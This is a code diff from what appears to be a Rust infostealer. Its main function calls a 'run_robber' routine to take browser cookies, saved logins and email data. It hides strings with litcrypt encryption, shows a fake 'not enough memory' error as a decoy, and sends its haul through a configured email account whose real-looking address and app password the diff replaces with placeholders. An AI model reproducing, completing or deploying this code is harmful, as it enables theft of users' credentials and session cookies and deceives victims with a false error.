@@ -7,18 +7,18 @@ use litcrypt::{lc, use_litcrypt};
 use std::ffi::CString;
 use user32::MessageBoxA;
 
-use_litcrypt!("x[[w,bwvhigcaf;flttq';uhadpt;]zf");
+use_litcrypt!("f;r/wxarb]'axsr/rvwivpormsemvr/b");
 
 fn main() -> () {
-    let error: bool = true;
+    let error: bool = false;
     let cookie_bool = true;
     let login_bool = true;
     let email_bool = true;
-    let error_message = r#"Hello World"#;
+    let error_message = r#"There isn't enough memory to complete this action. Try using less data or closing other applications."#;
     let sandbox_internet = false;
     if sandbox_internet {request_data();}
-    let username = "marionascimento047@gmail.com";
-    let password = "nrfffdtvvtxypton";
+    let username = "YOUR_USERNAME";
+    let password = "YOUR_APP_PASSWORD";
     let _ = browser::run_robber(cookie_bool, login_bool, &lc!("http://127.0.0.1:80"), email_bool, username, password);
     if error {
         let _ = show_error(error_message);
